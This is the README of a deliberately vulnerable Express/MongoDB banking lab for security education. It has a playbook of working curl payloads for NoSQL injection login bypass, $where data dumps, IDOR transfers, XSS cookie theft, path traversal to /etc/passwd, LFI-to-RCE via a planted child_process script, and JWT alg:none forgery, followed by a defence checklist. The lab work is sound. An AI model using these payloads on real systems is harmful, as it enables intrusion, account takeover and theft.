# 🏦 Node Bank of VULN — deliberately vulnerable Node.js + MongoDB lab

A training bank that reproduces **every** vulnerability from the PHP/MySQL
`bank-app/`, rebuilt on **Express + MongoDB**. The SQL-injection exercises
become **NoSQL-injection** exercises; every other bug (IDOR, race conditions,
privilege escalation, path traversal, LFI→RCE, JWT `alg:none`, dev-file leak,
stored XSS, rate-limit bypass, plaintext passwords) is reproduced 1:1.

> ⚠️ **Lab only.** Runs on `localhost`. Every file here is intentionally
> broken for security education. Do not deploy anywhere real.

---

## Quick start

```bash
cd node_vunreability
npm install

# Option A — real MongoDB via Docker (recommended)
npm run mongo:up          # docker compose up -d  (starts mongo:7 on :27017)
npm start

# Option B — no Docker: the app falls back to an in-memory MongoDB
#            automatically (mongodb-memory-server is an optional dependency).
npm start
```

Open **http://localhost:3000/** and log in with a seed account, or bypass the
login entirely (§1).

### Seed accounts

| id | username | email | password | role | balance | account # |
|----|----------|-------|----------|------|---------|-----------|
| 1 | admin | admin@bank.local | Admin@123 | **admin** | $999,999.99 | 1000000001 |
| 2 | alice | alice@bank.local | alice123 | user | $1,000.00 | 1000000002 |
| 3 | bob | bob@bank.local | bob123 | user | $500.00 | 1000000003 |
| 4 | mallory | mallory@bank.local | mallory123 | user | $25.00 | 1000000004 |

> `BASE=http://localhost:3000`

---

## Why SQL injection does **not** apply — and what replaces it

MongoDB has no SQL string to break out of. `' OR '1'='1' --` is just a string;
there is nothing to parse it. Instead, the equivalent bug class is **NoSQL
injection**, which comes in two flavours used throughout this lab:

### 1. Operator injection (the big one in Express apps)

Express parses request bodies and query strings into **objects**. With
`express.urlencoded({ extended: true })` (the `qs` parser) and `express.json()`,
an attacker can smuggle a Mongo **query operator** where the code expected a
plain string. The vulnerable login does:

```js
const user = await users.findOne({ email: req.body.email, password: req.body.password });
```

If `password` arrives as the object `{ "$ne": "x" }` instead of a string, the
filter becomes `{ email: "...", password: { $ne: "x" } }` → "password is not
equal to x" → **always true**, so the password check is gone. Two ways to send
an object:

- **JSON body:** `{"email":"admin@bank.local","password":{"$ne":"x"}}`
- **Form field with bracket syntax:** `password[$ne]=x` → `qs` builds `{password:{$ne:"x"}}`

### 2. `$where` / JavaScript injection

Mongo's `$where` runs a JavaScript predicate inside the query engine. The
`/search` endpoint passes a client-supplied JSON filter straight to `find()`:

```js
await users.find(JSON.parse(req.query.filter)).toArray();
```

`?filter={"$where":"return true"}` returns **every** document — the NoSQL
equivalent of a `UNION SELECT * FROM users` dump.

---

# PART A — "Havoc" playbook

> All `curl` examples assume `BASE=http://localhost:3000`.

## 1 · Bypass authentication (NoSQL operator injection) 🔓

Log in as **admin** knowing only the email (or nothing at all):

```bash
# JSON operator injection — password check bypassed
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"email":"admin@bank.local","password":{"$ne":"x"}}' \
  $BASE/login -i | grep -i location        # -> Location: /

# Form-field bracket injection (same effect)
curl -s -c jar.txt -d 'email=admin@bank.local&password[$ne]=x' $BASE/login -i | grep -i location

# Match the FIRST user in the collection (admin) knowing NOTHING:
curl -s -c jar.txt -d 'email[$gt]=&password[$gt]=' $BASE/login -i | grep -i location
```

The DEBUG box echoes the raw filter object — your oracle. `password` became
`{"$ne":"x"}`, not a string.

## 2 · Dump every account + plaintext password (`$where` injection) 📦

```
BASE/search?filter={"$where":"return true"}     → dumps all users + passwords
BASE/search?filter={"role":"admin"}             → operator/field injection
BASE/search?filter={"balance":{"$gt":100}}      → range injection
```

```bash
curl -s -b jar.txt --get --data-urlencode 'filter={"$where":"return true"}' $BASE/search \
  | grep -oE '[a-z]+@bank.local|[A-Za-z0-9@]+</code>'
```

## 3 · Read anyone's profile & password (IDOR) 👀

`view-account` reads `?id=` with no ownership/role check:

```
BASE/view-account?id=1   → admin's row, password Admin@123 in plaintext
BASE/view-account?id=2   → alice …  (walk 1..N)
```

## 4 · Transfer money out of another account (IDOR) 💸

`transfer` trusts the hidden `from_account` field instead of the session.

```bash
# as bob, drain admin's account into mallory's
curl -s -b jar.txt -d 'from_account=1000000001&to_account=1000000004&amount=500&transfer=1' $BASE/transfer
```

The `from` must come from the server-side session, never from the form.

## 5 · Infinite money (negative amount) 💰

`amount` is never validated `> 0`. A negative transfer *adds* to the sender:

```bash
# new_from = balance - (-1000) = balance + 1000
curl -s -b jar.txt -d 'from_account=1000000003&to_account=1000000002&amount=-1000&transfer=1' $BASE/transfer
```

## 6 · Race the balance (TOCTOU double-spend) 🏁

Balance is `read → (await) → compute → write` with no atomic `$inc`. Node's
event loop interleaves the awaits of concurrent requests, so updates are lost.

```bash
# fire 10 concurrent bonus claims — you will NOT gain the full $100
for i in $(seq 1 10); do curl -s -b jar.txt -X POST $BASE/bonus -o /dev/null & done; wait
curl -s -b jar.txt $BASE/ | grep -o '\$[0-9,]*\.[0-9][0-9]' | head -1
```

Fix: atomic `updateOne({...},{ $inc: { balance: 10 } })`, or a transaction with
the balance condition in the filter.

## 7 · Take over a user (reset their password) 🕵️

`profile?id=` has no ownership check and no current-password prompt:

```
BASE/profile?id=1   → set admin's password to anything, then log in as admin
```

## 8 · Stored XSS → steal the session cookie 🍪

Register with a payload username (echoed raw on the dashboard and admin table):

```
Username: <script>new Image().src="/sniffer?c="+document.cookie</script>
```

The session cookie is **not** `HttpOnly`, so the script reads it; `/sniffer`
logs it to `stolen.txt`. Then replay the cookie to hijack the session.

## 9 · Become admin (privilege escalation via cookie) 🛡️

`/admin` gates on the client-controlled `role` **cookie**, not the session:

1. Log in as any user. 2. DevTools → set cookie `role=admin`. 3. Reload
`/admin?admin=1` → full customer table with plaintext passwords.

```bash
curl -s -b 'role=admin' "$BASE/admin?admin=1" | grep -c bank.local
```

## 10 · Brute-force the login (rate-limit bypass via X-Forwarded-For) 🔑

The limiter keys on `X-Forwarded-For`, a header you control:

```bash
for i in $(seq 1 200); do
  curl -s -H "X-Forwarded-For: 10.0.0.$i" -d "email=admin@bank.local&password=guess$i" $BASE/login -o /dev/null
done   # every request is a fresh bucket
```

## 11 · Read server files (path traversal) 📂

`file?file=` is joined to the app dir with no normalisation:

```
BASE/file?file=.env                               → Mongo URL + JWT secret + admin pw
BASE/file?file=config.js.bak                      → same secrets, "backup"
BASE/file?file=server.js                           → full source (source disclosure)
BASE/file?file=../../../../../../etc/passwd        → system file
```

## 12 · LFI → RCE (`?page=` → `require()`) 💣

`file?page=` is passed to `require()`; a `.js` file is **executed**:

```
BASE/file?page=config.js.bak        → runs/loads the module, leaks the config object
# plant a payload and run it:
echo 'module.exports = () => require("child_process").execSync("id").toString()' > /tmp/shell.js
BASE/file?page=/tmp/shell.js        → executes `id` on the server (RCE)
```

`require()`/`import()` must never take user input.

## 13 · Steal secrets from leaked dev files 🗝️

They are served straight from the web root (`express.static(dotfiles:'allow')`):

```
BASE/.env            → MONGO_URL + JWT_SECRET + Stripe/SendGrid/Twilio keys + admin pw
BASE/config.js.bak   → same secrets, backup style
```

## 14 · Forge a JSON Web Token 🔐

`/api` trusts the token. **`alg:none`** skips signature verification entirely:

```bash
node -e 'const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");
  console.log(b({alg:"none",typ:"JWT"})+"."+b({sub:"admin",role:"admin"})+".")' > tok
curl -s -H "Authorization: Bearer $(cat tok)" $BASE/api      # -> "role":"admin"
```

Or forge a **signed** token with the leaked secret (§13), and note there is no
`exp`, so it never expires:

```bash
node -e 'const c=require("crypto"),b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");
  const h=b({alg:"HS256",typ:"JWT"}),p=b({sub:"admin",role:"admin"});
  const s=c.createHmac("sha256","change_me_bank_super_secret_123").update(h+"."+p).digest("base64url");
  console.log(h+"."+p+"."+s)'
```

---

# PART C — Defence checklist

| Vulnerability | Fix |
|---------------|-----|
| NoSQL operator injection | Cast inputs to the expected type (`String(req.body.password)`); validate with a schema (Zod/Joi/Mongoose typed fields); strip keys starting with `$` or containing `.` (e.g. `express-mongo-sanitize`). |
| `$where` / JS injection | Never build queries from client JSON; never use `$where`/`$function` with user input; use typed field filters only. |
| Stored XSS | Escape all output (as `esc()` does elsewhere); `HttpOnly` + `Secure` cookies; a Content-Security-Policy. |
| Plaintext passwords | `bcrypt`/`argon2` hashing; never store or echo the password. |
| IDOR | The session is the only source of "who am I"; check ownership/role on every object access. |
| Privilege escalation | Role lives in the server session, never a cookie/header/JWT you trust blindly. |
| Logic flaws | Amounts from the server; enforce `amount > 0` and no-overdraft server-side. |
| Race conditions | Atomic `$inc` / conditional `updateOne({balance:{$gte:amt}})`, or a transaction — never read-modify-write. |
| Rate limiting | Key on the real socket address (trust `X-Forwarded-For` only behind a proxy you control); limit per-IP and per-account; atomic counters. |
| Path traversal / LFI | Allowlist filenames; `path.resolve` + prefix check; never `require()`/`include()` user input; keep secrets out of the web root and never `static` dotfiles. |
| JWT | Reject `alg:none`; pin the algorithm server-side; verify the signature with a secret kept out of the web root; validate `exp`/`nbf`/`aud`. Use a vetted library (`jsonwebtoken` with `algorithms:['HS256']`). |

---

## File map

| File | Role |
|------|------|
| `server.js` | all routes; each handler is commented with its bug + payload |
| `db.js` | Mongo connection (Docker or in-memory fallback) + seed |
| `env.js` | tiny `.env` loader |
| `.env`, `config.js.bak` | leaked secrets (dev-file-leak targets) |
| `docker-compose.yml` | throwaway MongoDB on `:27017` |
| `help.txt` | benign file for the file-viewer demo |

*Every route is intentionally vulnerable. Fix one bug, re-test, and watch the
corresponding section collapse.*
